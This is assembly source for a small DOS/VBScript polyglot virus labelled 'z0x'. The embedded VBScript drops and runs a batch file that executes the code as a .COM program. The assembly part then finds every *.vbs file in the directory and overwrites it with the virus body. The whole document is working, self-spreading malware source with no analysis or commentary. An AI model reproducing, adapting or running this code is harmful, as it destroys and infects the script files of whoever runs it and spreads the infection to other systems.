   .model tiny
   .code
   org 100h
   start:
   db "'"
   jmp v_start
   db 13,10
   db 'Dim a,f,s',13,10
   db 'Set a = Wscript.CreateObject("Wscript.Shell")',13,10
   db 'Set f = CreateObject("Scripting.FileSystemObject")',13,10
   db 'Set s = f.CreateTextFile("z0x.bat", 2, False)',13,10
   db 's.WriteLine "echo off"',13,10
   db 's.WriteLine "copy " & Wscript.ScriptFullName & " z0x.com>NUL"',13,10
   db 's.WriteLine "z0x.com"',13,10
   db 's.WriteLine "del z0x.com"',13,10
   db 's.Close',13,10
   db 'a.Run ("z0x.bat")',13,10
   db 13,10
   db "'"
   v_start:
   mov ah,4eh
   mov dx,offset vbs_
   int 21h
   find_file:
   jc exit_virus
   mov ax,3d02h
   mov dx,09eh
   int 21h
   xchg bx,ax
   infect:
   mov ah,40h
   mov cx,_end - start
   mov dx,offset start
   int 21h
   close:
   mov ah,3eh
   int 21h
   mov ah,4fh
   int 21h
   jmp find_file
   exit_virus:
   int 20h
   vir db 'z0x'
   vbs_ db '*.vbs', 00h
   _end equ $
   end start
